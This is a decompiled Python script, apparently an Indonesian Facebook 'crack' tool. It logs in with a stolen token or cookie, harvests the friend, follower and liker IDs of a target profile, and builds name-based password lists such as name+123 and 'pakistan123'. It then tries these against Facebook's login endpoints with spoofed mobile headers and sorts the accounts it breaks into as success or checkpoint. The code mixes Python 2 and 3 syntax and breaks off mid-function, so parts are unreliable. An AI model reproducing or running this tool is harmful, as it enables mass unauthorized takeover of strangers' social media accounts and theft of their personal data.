# Decompile Angga Ady
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2021-12-9 15:47:11.403269
#Rekode Kontol
#LiaCans
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote
P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati
url_license = 'https://ngepetonline.000webhostapp.com/chek.php?project=testlicence&apikey='
host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")
def banner():
    print("""
\x1b[0;96m._______ _____   ___________________________ 
\x1b[0;96m ___    |___  | / /__  ____/__  ____/___    |  ® \033[0m|| Recode By : Angga Ady
\x1b[0;96m __  /| |__   |/ / _  / __  _  / __  __  /| |      \033[0m|| Github.com/AnggaXD13
\x1b[0;96m _  ___ |_  /|  /  / /_/ /  / /_/ /  _  ___ |  \033[0m|| Instagram: https://www.instagram.com/Anggatp55
\x1b[0;96m /_/  |_|/_/ |_/   \____/   \____/   /_/  |_|  \033[0;91mv2.7  \033[0m|| Facebook.com/AnggaXD13
""")
def menu_log():
    os.system('rm -rf token.txt')
    clear()
    banner()
    var_menu()
    pmu = input('%s►%s►%s► '%(B,M,H))
    if pmu in ['']:
        jalan('%s%s►%s►%s► Isi Yang Benar!'%(B,M,H))
        menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        token = input('%s►%s►%s► Token : '%(B,M,H))
        try:
            x = requests.get("https://graph.facebook.com/me?access_token=" + token)
            y = json.loads(x.text)
            n = y['name']
            xd = open("token.txt", "w")
            xd.write(token)
            xd.close()
            jalan('%s►%s►%s► Login Sukses '%(B,M,H))
            menu()
        except (KeyError,IOError):
            jalan('%s►%s►%s► Token Salah! '%(B,M,H))
            os.system('rm -rf token.txt')
            menu_log()
        except requests.exceptions.ConnectionError:
            jalan('%s►%s►%s► Koneksi Bermasalah!'%(B,M,H))
            exit()
    elif pmu in ['2','02','002','b']:
        defaultua()
        cookie = input('%s►%s►%s► Cookies : '%(B,M,H))
        try:
            data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
            "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
            "referer"                   : "https://m.facebook.com/",
            "host"                      : "m.facebook.com",
            "origin"                    : "https://m.facebook.com",
            "upgrade-insecure-requests" : "1",
            "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control"             : "max-age=0",
            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type"              : "text/html; charset=utf-8"
            }, cookies = {
            "cookie"                    : cookie
            })
            find_token = re.search("(EAAA\w+)", data.text)
            hasil = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
            xd = open("token.txt", "w")
            xd.write(find_token.group(1))
            xd.close()
            jalan('%s%s►%s►%s► Login Sukses'%(B,M,H))
            menu()
        except requests.exceptions.ConnectionError:
            jalan('%s►%s►%s► Koneksi Bermasalah!'%(B,M,H))
            exit()
        except (KeyError,IOError,AttributeError):
            jalan('%s►%s►%s► Cookies Salah!'%(B,M,H))
            os.system('rm -rf token.txt')
            menu_log()
    elif pmu in ['3','03','003','c']:
        clear()
        banner()
        var_tutor()
        pf = input('%s►%s►%s► '%(B,M,H))
        if pf in ['']:
            jalan('%s►%s►%s► Isi Yang Benar!'%(B,M,H))
            menu_log()
        elif pf in ['1','01','001','a']:
            os.system('xdg-open https://facebook.com/BHAIDADAHO')
            input('%s►%s►%s► [Kembali]'%(B,M,H))
            menu_log()
        elif pf in ['2','02','002','b']:
            os.system('xdg-open https://facebook.com/BHAIDADAHO')
            input('%s►%s►%s► [Kembali]'%(B,M,H))
            menu_log()
        elif pf in ['3','03','003','c']:
            os.system('xdg-open https://facebook.com/BHAIDADAHO')
            tutor_target()
            input('%s►%s►%s► [Kembali]'%(B,M,H))
            menu_log()
        elif pf in ['4','04','004','d']:
            tutor_crack()
            input('%s►%s►%s► [Kembali]'%(B,M,H))
            menu_log()
        else:
            jalan('%s►%s►%s► Isi Yang Benar!'%(B,M,H))
            menu_log()
    elif pmu in ['4','04','004','d']:
        clear()
        banner()
        var_author()
        input('%s╰⇒[ %sReturn %s]%s'%(B,M,P,M))
        menu_log()
    elif pmu in ['0','00','000','e']:
        jalan('%s►%s►%s► %sTerimakasih Telah Memakai Script Ini'%(B,M,H,O))
        jalan('%s►%s►%s► %sJangan Lupa Kembali Lagi:)'%(B,M,H,O))
        os.system('rm -rf token.txt')
        clear()
        exit()
    else:
        jalan('%s►%s►%s► Isi Yang Benar'%(B,M,H))
        menu_log()
def menu():
    clear()
    banner()
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        kun = lisensi.split('-')
        users = wk['username']
        mailerts = wk['email'].split('@')
        mailert1 = mailerts[0]
        mailert2 = mailerts[1]
        mailer = mailert1[:2]
        maile = (mailer+'xxxxx@'+mailert2)
        bergabung = wk['joined']
        kadaluarsa = wk['expired']
        status = ('%sPremium [%sPro%s]'%(O,P,O))
        kunci = ('%s%s%s-%s%s%s-%sXXXXX'%(O,kun[0],P,O,kun[1],P,O))
        pro = ''
        upgrade = 'Ganti License Key'
        jid = ''
    except (KeyError,IOError):
        status = 'Premium'
        users = 'Lia'
        maile = 'aberingaz***@gmail.com'
        kunci = 'JFUOKG-BGJIKG-XXXXX'
        bergabung = 'Pada Baru Dibuat'
        kadaluarsa = '20 desember 2022'
        upgrade = ('Upgrade To Version %sPro'%(O))
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
        i = y['id']
    except (KeyError,IOError):
        jalan('%s►%s►%s► Token/Cookie Salah!'%(B,M,H))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s►%s►%s► Koneksi Bermasalah!'%(B,M,H))
        exit()
    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()
    try:
        ip = a["query"]
    except KeyError:
        ip = " "
    print logo
    IP = requests.get('https://www.yayanxd.my.id/server/ip/').text
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' (\033[0;96m•\033[0m) ACTIVE USER : %s'%(nama);time.sleep(0.03)
    print ' (\033[0;96m•\033[0m) IP DEVICE   : %s'%(IP)
    print '___________________________________________________________\n';time.sleep(0.03)
    print ' [%s01%s]. Crack From Public'%(B,H,M,O))
    print ' [%s02%s]. Crack From Follower'%(B,H,M,O))
    print ' [%s03%s]. Crack From likes post'%(B,H,M,O))
    print ' [%s04%s]. Mengambil Data Target'%(B,H,M,O))
    print ' [%s05%s]. Dump ID '%(B,H,M,O))
    print ' [%s06%s]. Check Crack Results'%(B,H,M,O))
    print ' [%s07%s]. Check Crack Result Options '%(O,P,O,P))
    print ' [%s08%s]. User Agent %sU%s/%sA'%(B,H,M,O,U,P,O))
    #print('%s►%s►%s► 9. %sCrack From Nomber'%(O,P,O,P))
    #print('%s►%s►%s► 10. %sCrack Instagram'%(B,H,M,O))
    print ' [%s01%s]. Log Out'%(O,P,O,P))
    pm = input('%s►%s►%s► '%(B,H,M))
    if pm in ['']:
        jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
        menu()
    elif pm in ['1','01','001','a']:
        publik()
    elif pm in ['2','02','002','b']:
        pengikut()
    elif pm in ['3','03','003','c']:
        likers()
    elif pm in ['4','04','004','d']:
        target()
    elif pm in ['5','05','005','e']:
        teman_target()
    elif pm in ['6','06','006','f']:
        hasil()
    elif pm in ['7','07','007','g']:
        cek_hasil()
    elif pm in ['8','08','008','h']:
        ugen()
    #elif pm in ['9','09','009','i']:
        #random_numbers()
    #elif pm in ['10','010','0010','j']:
    	#IqbalDevIg()
    elif pm in ['0','00','000','j']:
        jalan('%s►%s►%s► %sSampai Jumpa Lagi'%(B,H,M,O))
        os.system('rm -rf token.txt')
        menu_log()
    else:
        jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
        menu()
def defaultua():
    ua = ua_nokia
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError,IOError):
        menu_log()
def ugen():
    var_ugen()
    pmu = input('%s►%s►%s► '%(B,H,M))
    if pmu in[""]:
        jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
        menu()
    elif pmu in ['1','01','001','a']:
        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        input('%s►%s►%s►[ %sBack %s]%s'%(B,H,M,H,M,O))
        menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt")
        ua = input("%s╰⇒[%s•%s] %sEnter User Agent : \n\n"%(O,P,O,P))
        try:
            ugent = open('ugent.txt','w')
            ugent.write(ua)
            ugent.close()
            jalan("%s►%s►%s►[ %sSuccesfully Changed User Agent %s]"%(B,H,M,H,M))
            input('%s►%s►%s►[ %sKembali %s]%s'%(B,H,M,H,M,O))
            menu()
        except (KeyError,IOError):
            jalan("%s►%s►%s► Gagal Menganti User Agent"%s(B,H,M))
            input('%s►%s►%s► [ Kembali ]%s'%(B,H,M,O))
            menu()
    elif pmu in ['3','03','003','c']:
        ugen_hp()
    elif pmu in ['4','04','004','d']:
        os.system("rm -rf ugent.txt")
        jalan("%s►%s►%s► %sUser Agent Berhasil Dihapus"%(B,H,M,O))
        input('%s►%s►%s► %sReturn %s'%(B,H,M,O,U))
        menu()
    elif pmu in ['5','05','005','e']:
        try:
            ungser = open('ugent.txt', 'r').read()
        except (KeyError,IOError):
            ungser = 'Not Found'
        print("%s►%s►%s► %sYour User Agent  : %s"%(B,H,M,O,U,ungser))
        jalan("%s►%s►%s► %sThis is your current user agent"%(B,H,M,O))
        input('%s►%s►%s► %sReturn '%(B,H,M,O))
        menu()
    elif pmu in ['0','00','000','f']:
        menu()
    else:
        jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O))
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print('%s►%s►%s► 1. %sXiaomi'%(B,H,M,O))
    print('%s►%s►%s► 2. %sNokia'%(B,H,M,O))
    print('%s►%s►%s► 3. %sAsus'%(B,H,M,O))
    print('%s►%s►%s► 4. %sHuawei'%(B,H,M,O))
    print('%s►%s►%s► 5. %sVivo'%(B,H,M,O))
    print('%s►%s►%s► 6. %sOppo'%(B,H,M,O))
    print('%s►%s►%s► 7. %sSamsung'%(B,H,M,O))
    print('%s►%s►%s► 8. %sWindows'%(B,H,M,O))
    pc = input('%s►%s►%s► '%(B,H,M))
    if pc in['']:jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O));menu()
    elif pc in ['1','01']:
        ugent = open('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:
        ugent = open('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:
        ugent = open('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:
        ugent = open('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:
        ugent = open('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:
        ugent = open('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:
        ugent = open('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:
        ugent = open('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    else:jalan('%s►%s►%s► %sIsi Yang Benar'%(B,H,M,O));menu()
    jalan("%s►%s►%s► %sSuccessfully Changed User Agent"%(B,H,M,O))
    input('%s►%s►%s► %sBack '%(B,H,M,O))
    menu()

def publik():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '5000'
    except (KeyError,IOError):
        jid = '5000'
    except requests.exceptions.ConnectionError:
        jalan('%s►%s►%s► %sConnection Problem'%(B,H,M,O))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s►%s►%s► %sToken/Cookies Invalid'%(B,H,M,O))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s►%s►%s► %sConnection Problem'%(B,H,M,O))
        exit()
    try:
        print('%s►%s►%s► %sMASUKAN ID'%(B,H,M,O))
        it = input("%s►%s►%s►%sID Target : "%(B,H,M,O))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s►%s►%s► %sName : %s'%(B,H,M,O,ob['name']))
        except (KeyError,IOError):
            jalan('%s►%s►%s► %sID Not Found'%(B,H,M,O))
            menu()
        r = requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s►%s►%s► %sTotal ID : %s'%(B,H,M,O,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s►%s►%s► %sError : %s'%(B,H,M,O,e))
def pengikut():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '10000'
    except (KeyError,IOError):
        jid = '5000'
    except requests.exceptions.ConnectionError:
        jalan('%s►%s►%s► %sConnection Problem'%(B,H,M,O))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s►%s►%s► %sToken/Cookies Invalid'%(B,H,M,O))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s►%s►%s► %sConnection Problem'%(B,H,M,O))
        exit()
    try:
        print('%s►%s►%s► %sInput ID '%(B,H,M,O))
        it = input("%s►%s►%s► %sID Target : "%(B,H,M,O))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s►%s►%s► %sName : '%(B,H,M,O,ob['name']))
        except (KeyError,IOError):
            jalan('%s►%s►%s► %sID Not Found'%(B,H,M,O))
            menu()
        r = requests.get("https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s►%s►%s► %sTotal ID : '%(B,H,M,O,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s►%s►%s► %sError : %s'%(B,H,M,O,e))
def likers():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '10000'
    except (KeyError,IOError):
        jid = '5000'
    except requests.exceptions.ConnectionError:
        jalan('%s►%s►%s► %sConnection Problem'%(B,H,M,O))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s►%s►%s► %sToken/Cookies Invalid'%(B,H,M,O))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s►%s►%s► %sConnection Problem'%(B,H,M,O))
        exit()
    try:
        print('%s►%s►%s► %sMASUKAN ID'%(B,H,M,O))
        it = input("%s►%s►%s► %sID Target : "%(B,H,M,O))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s►%s►%s► %sName : %s'%(B,H,M,O,ob['name']))
        except (KeyError,IOError):
            jalan('%s►%s►%s► %sID Not Found'%(B,H,M,O))
            menu()
        r = requests.get("https://graph.facebook.com/%s/likes?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s►%s►%s► %sTotal ID : '%(B,H,M,O,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s►%s►%s► %sError : '%(B,H,M,O,e))
def generate1(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"786")
                _dapunta_.append(i+"1122")
            elif len(i)>=6:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"786")
                _dapunta_.append(i+"1122")
            else:
                continue
    _dapunta_.append(_cici_.lower())
    return _dapunta_
def generate2(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"1122")
                _dapunta_.append(i+"786")
            else:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"1122")
                _dapunta_.append(i+"786")
    _dapunta_.append(_cici_.lower())
    _dapunta_.append("indonesia")
    _dapunta_.append("sayangkamu")
    _dapunta_.append("bangsat")
    return _dapunta_
def generate3(_cici_):
    _dapunta_=[]
    for i in _cici_.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"1122")
                _dapunta_.append(i+"786")
            else:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"1122")
                _dapunta_.append(i+"786")
    _dapunta_.append(_cici_.lower())
    _dapunta_.append("pakistan")
    _dapunta_.append("pakistan123")
    _dapunta_.append("786786")
    _dapunta_.append("khankhan")
    _dapunta_.append("223344")
    _dapunta_.append("khan1234")
    return _dapunta_
def generate4(_cici_):
    _dapunta_=[]
    ps = open('pass.txt','r').read()
    pp = open('passangka.txt','r').read()
    for i in _cici_.split(" "):  
        i=i.lower()
        if len(i)<3:continue
        elif len(i)==3 or len(i)==4 or len(i)==5:
            _dapunta_.append(i+"123")
            _dapunta_.append(i+"12345")
            _dapunta_.append(i+"1234")
            _dapunta_.append(i+"1122")
            _dapunta_.append(i+"786")
        else:
            _dapunta_.append(i)
            _dapunta_.append(i+"123")
            _dapunta_.append(i+"12345")
            _dapunta_.append(i+"1234")
            _dapunta_.append(i+"1122")
            _dapunta_.append(i+"786")
    if pp in ['',' ','  ']:pass
    else:
        for i in _cici_.split(" "):  
            i=i.lower()
            for x in pp.split(','):
                _dapunta_.append(i+x)
    if ps in ['',' ','  ']:pass
    else:
        for z in ps.split(','):
            _dapunta_.append(z)
    _dapunta_.append(_cici_.lower())
    return _dapunta_
def tambah_pass():
    print('%s►%s►%s► %sFor Example :  lia,123456,786786'%(B,H,M,O))
    cuy = input('%s►%s►%s► %sMasukkan Pass Tambahan Manual [1 Kata] : '%(B,H,M,O))
    gh = open('pass.txt','w')
    gh.write(cuy)
    gh.close
def tambah_pass_angka():
    print('%s►%s►%s► %sFor Example : 321,786,1122,123'%(B,H,M,O))
    coy = input('%s►%s►%s► %sEnter Additional Pass Behind Name : '%(B,H,M,O))
    xy = open('passangka.txt','w')
    xy.write(coy)
    xy.close
    
def log_api(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
        'format': 'json', 
        'sdk_version': '2', 
        'email': em, 
        'locale': 'en_US', 
        'password': pas, 
        'sdk': 'ios', 
        'generate_session_cookies': '1', 
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def log_free(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://free.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def cek_log(user, pasw, h_cp):
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"
    mb = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": mb,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": mb+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
